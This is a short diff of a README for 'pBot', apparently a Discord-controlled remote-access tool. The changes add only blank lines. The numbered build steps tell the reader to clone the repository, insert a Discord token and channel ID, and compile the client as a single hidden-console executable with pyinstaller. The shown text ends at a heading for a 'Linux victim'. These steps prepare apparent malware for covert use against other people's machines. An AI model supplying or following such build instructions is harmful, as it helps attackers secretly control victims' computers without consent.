@@ -44,9 +44,13 @@ bnt: @udbnt
 
 # Installation and Build
 1- "https://tinyurl.com/HowToCreateDiscordBot"
+
 2- git clone https://github.com/rxu7s/pBot.git
+
 3- cd pBot
+
 4- "Edit token and channel id on Client.py"
+
 5- pyinstaller --onefile --noconsole Client.py
 
 # Linux victim
